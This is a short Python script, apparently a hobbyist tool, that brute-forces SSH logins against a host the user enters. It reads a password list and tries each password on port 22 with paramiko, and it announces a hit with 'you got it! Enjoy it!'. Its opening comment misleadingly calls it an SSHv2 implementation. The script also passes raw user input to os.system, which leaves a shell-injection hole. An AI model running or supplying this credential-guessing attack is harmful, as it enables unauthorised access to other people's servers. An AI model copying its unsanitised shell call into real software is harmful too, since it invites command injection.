# A Python implementation of SSHv2.
import paramiko
import os

# Get HOST IP and Username
host = raw_input("Host IP: ")
username = raw_input("Username: (root maybe?) ")
extraWords = raw_input("Do you want to ad any words to the list?(separate them with comas):  ")
os.system("echo ' " + extraWords + "'  >> paslist.txt")

# Read password dictionary list
with open('paslist.txt', 'r') as passlistRead:
    passlist = passlistRead.read().split()

# Aesthetics
line = "---------------------------------------------------"

# conection variable
def ssh_connect(password):
    code = True
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = False
    ssh.close()
    return code

for password in passlist:
    try:
        connect = ssh_connect(password)
        if connect:
            print("\n")
            print(line + "\n Password found: " + password + " you got it! Enjoy it!" + "\n" + line)
            break
        elif not connect:
            print("[*] The password " + password + " is not correct!")
    except:
        pass
